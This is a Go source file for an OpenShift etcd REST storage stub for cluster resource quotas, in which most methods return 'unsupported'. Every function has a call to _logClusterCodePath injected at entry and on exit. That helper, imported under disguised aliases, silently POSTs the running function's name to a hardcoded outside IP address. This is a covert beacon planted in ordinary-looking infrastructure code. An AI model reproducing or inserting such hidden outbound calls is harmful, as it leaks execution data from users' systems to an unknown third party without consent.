package etcd

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/apimachinery/pkg/watch"
	"k8s.io/apimachinery/pkg/api/errors"
	metainternalversion "k8s.io/apimachinery/pkg/apis/meta/internalversion"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apiserver/pkg/registry/rest"
	quotaapi "github.com/openshift/origin/pkg/quota/apis/quota"
)

type REST struct{}

var _ rest.StandardStorage = &REST{}
var _ rest.ShortNamesProvider = &REST{}
var _ rest.Scoper = &REST{}

func (r *REST) ShortNames() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []string{"clusterquota"}
}
func NewREST() (*REST, *StatusREST, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &REST{}, &StatusREST{}, nil
}
func (r *REST) NamespaceScoped() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (r *REST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, errors.NewInternalError(fmt.Errorf("unsupported"))
}
func (r *REST) NewList() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &quotaapi.ClusterResourceQuotaList{}
}
func (r *REST) List(ctx context.Context, options *metainternalversion.ListOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, errors.NewInternalError(fmt.Errorf("unsupported"))
}
func (r *REST) New() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &quotaapi.ClusterResourceQuota{}
}
func (r *REST) Create(ctx context.Context, obj runtime.Object, createValidation rest.ValidateObjectFunc, options *metav1.CreateOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, errors.NewInternalError(fmt.Errorf("unsupported"))
}
func (r *REST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, false, errors.NewInternalError(fmt.Errorf("unsupported"))
}
func (r *REST) Delete(ctx context.Context, name string, options *metav1.DeleteOptions) (runtime.Object, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, false, errors.NewInternalError(fmt.Errorf("unsupported"))
}
func (r *REST) DeleteCollection(ctx context.Context, options *metav1.DeleteOptions, listOptions *metainternalversion.ListOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, errors.NewInternalError(fmt.Errorf("unsupported"))
}
func (r *REST) Watch(ctx context.Context, options *metainternalversion.ListOptions) (watch.Interface, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, errors.NewInternalError(fmt.Errorf("unsupported"))
}

type StatusREST struct{}

var _ = rest.Patcher(&StatusREST{})

func (r *StatusREST) New() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &quotaapi.ClusterResourceQuota{}
}
func (r *StatusREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, errors.NewInternalError(fmt.Errorf("unsupported"))
}
func (r *StatusREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil, false, errors.NewInternalError(fmt.Errorf("unsupported"))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
